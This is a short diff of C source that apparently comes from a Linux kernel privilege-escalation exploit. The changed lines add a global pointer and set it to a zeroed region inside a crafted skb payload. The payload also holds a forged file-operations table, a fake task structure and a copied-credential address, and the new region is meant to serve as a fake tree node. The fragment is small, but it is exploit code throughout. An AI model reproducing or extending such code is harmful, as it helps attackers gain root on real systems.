@@ -31,6 +31,7 @@ uintptr_t g_cred_copy;
 uintptr_t g_ghost_kva;
 uintptr_t g_waiter_stack_hint;
 uintptr_t g_cc_parent;
+uintptr_t g_scratch_node;
 uintptr_t binwrite_target;
 /* 1 while the staged SLIDE_SWAP table is live (see put_fake_fops_table):
  * configfs_read_once arms .read around each pread so system read()
@@ -1535,6 +1536,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
+  g_scratch_node = payload_base + SCRATCH_OFF;  /* zeroed: black root, no children */
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (pselect_custom_write) {
       if (pselect_child_node) {
